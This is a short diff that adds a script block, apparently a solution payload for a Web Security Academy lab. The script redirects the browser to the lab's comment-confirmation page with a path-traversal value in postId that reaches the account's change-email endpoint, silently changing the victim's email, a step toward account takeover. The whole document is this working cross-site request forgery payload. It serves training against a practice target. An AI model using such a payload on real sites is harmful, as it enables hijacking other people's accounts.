@@ -1,0 +1,5 @@
+
+
+<script>
+document.location="https://0a98005c046ea80d866545b8003c0066.web-security-academy.net/post/comment/confirmation?postId=../../my-account/change-email?email=test2%40test.ca%26submit=1";
+</script>
